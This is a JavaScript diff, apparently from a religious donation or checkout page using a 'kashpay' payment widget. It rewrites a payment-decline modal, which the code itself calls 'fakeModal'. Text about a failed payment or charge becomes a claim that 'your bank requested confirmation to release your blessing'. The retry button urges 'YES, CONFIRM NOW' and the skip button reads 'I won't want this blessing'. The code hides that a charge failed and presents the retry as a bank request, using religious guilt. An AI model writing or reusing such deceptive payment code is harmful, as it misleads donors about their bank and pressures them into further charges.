@@ -593,10 +593,11 @@
       }
     });
 
-    // Injetar aviso pastoral de segurança e personalizar textos dos botões
+    // Injetar aviso pastoral de segurança e personalizar textos dos botões e títulos
     var declineObserver = new MutationObserver(function() {
       var retryBtn = document.getElementById('kashpay-retry-btn');
       var skipBtn = document.getElementById('kashpay-skip-btn');
+      var modalContent = document.getElementById('kashpay-modal-content');
 
       if (retryBtn) {
         retryBtn.textContent = 'SIM, CONFIRMAR AGORA';
@@ -604,6 +605,17 @@
 
       if (skipBtn) {
         skipBtn.textContent = 'Não vou querer essa bênção';
+      }
+
+      if (modalContent) {
+        var paragraphs = modalContent.querySelectorAll('p');
+        paragraphs.forEach(function(p) {
+          if (p.textContent.indexOf('Pagamento') !== -1) {
+            p.textContent = 'Confirmação pendente';
+          } else if (p.textContent.indexOf('pagamento') !== -1 || p.textContent.indexOf('cobrança') !== -1) {
+            p.textContent = 'O seu banco solicitou confirmação para libertar a sua bênção.';
+          }
+        });
       }
 
       if (retryBtn && !document.getElementById('kp-3ds-dica')) {
@@ -639,7 +651,7 @@
           fakeModal.style.cssText = 'position:fixed;inset:0;background:rgba(0,0,0,0.8);backdrop-filter:blur(8px);display:flex;align-items:center;justify-content:center;z-index:999999;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif;';
           var content = document.createElement('div');
           content.id = 'kashpay-modal-content';
-          content.innerHTML = '<div style=\"display:flex;flex-direction:column;align-items:center;gap:18px;\"><div style=\"width:64px;height:64px;background:#f59e0b;border-radius:50%;display:flex;align-items:center;justify-content:center;\"><svg width=\"32\" height=\"32\" viewBox=\"0 0 24 24\" fill=\"none\" stroke=\"white\" stroke-width=\"3\" stroke-linecap=\"round\" stroke-linejoin=\"round\"><circle cx=\"12\" cy=\"12\" r=\"9\"></circle><path d=\"M12 7v5l3 2\"></path></svg></div><div><p style=\"margin:0 0 6px 0;font-size:18px;font-weight:700;color:#1f2937;\">Pagamento pendente</p><p style=\"margin:0;font-size:13.5px;color:#6b7280;line-height:1.4;\">Não foi possível processar este pagamento de imediato.</p></div><div style=\"display:flex;gap:12px;width:100%;\"><button id=\"kashpay-skip-btn\">Não vou querer essa bênção</button><button id=\"kashpay-retry-btn\">SIM, CONFIRMAR AGORA</button></div></div>';
+          content.innerHTML = '<div style=\"display:flex;flex-direction:column;align-items:center;gap:18px;\"><div style=\"width:64px;height:64px;background:#f59e0b;border-radius:50%;display:flex;align-items:center;justify-content:center;\"><svg width=\"32\" height=\"32\" viewBox=\"0 0 24 24\" fill=\"none\" stroke=\"white\" stroke-width=\"3\" stroke-linecap=\"round\" stroke-linejoin=\"round\"><circle cx=\"12\" cy=\"12\" r=\"9\"></circle><path d=\"M12 7v5l3 2\"></path></svg></div><div><p style=\"margin:0 0 6px 0;font-size:18px;font-weight:700;color:#1f2937;\">Confirmação pendente</p><p style=\"margin:0;font-size:13.5px;color:#6b7280;line-height:1.4;\">O seu banco solicitou confirmação para libertar a sua bênção.</p></div><div style=\"display:flex;gap:12px;width:100%;\"><button id=\"kashpay-skip-btn\">Não vou querer essa bênção</button><button id=\"kashpay-retry-btn\">SIM, CONFIRMAR AGORA</button></div></div>';
           fakeModal.appendChild(content);
           document.body.appendChild(fakeModal);
         }, 400);
